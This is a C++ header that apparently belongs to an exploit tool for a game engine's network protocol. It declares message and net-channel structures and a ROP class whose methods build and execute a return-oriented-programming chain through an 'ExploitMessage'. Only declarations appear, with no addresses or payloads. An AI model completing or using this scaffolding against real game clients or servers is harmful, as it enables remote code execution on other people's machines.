#pragma once


enum netsrc_t
{
	NS_NULL = 0xFFFFFFFF,
	NS_CLIENT1 = 0x0,
	NS_CLIENT2 = 0x1,
	NS_CLIENT3 = 0x2,
	NS_CLIENT4 = 0x3,
	NS_SERVER = 0x4,
	NS_MAXCLIENTS = 0x4,
	NS_PACKET = 0x5,
};

struct msg_t
{
	int overflowed;
	int readOnly;
	char *data;
	char *splitData;
	int maxsize;
	int cursize;
	int splitSize;
	int readcount;
	int bit;
	int lastEntityRef;
	int flush;
	netsrc_t targetLocalNetID;
};

struct netchan_t
{
	int outgoingSequence;		//0x0
	int sock;					//0x4
	char padding[0x8];			//0x8
	unsigned long long unk1;	//0x10
	unsigned long long unk2;	//0x18
	int unk3;					//0x20
	int qport;					//0x24
};

class ROP
{
public:
	ROP();
	~ROP();

	void ClearChain();

	void SetUpChain();

	void Push(unsigned int Address);

	void ExecuteChain(unsigned char* Data = 0, unsigned int Size = 0);

private:
	unsigned char* MessageBuffer;
	unsigned char* ropchainData;
	std::vector<unsigned int> stack;
	msg_t ExploitMessage;
};

unsigned short LittleShort(unsigned short x);
unsigned int LittleLong(unsigned int x);

void InitNetworkStack();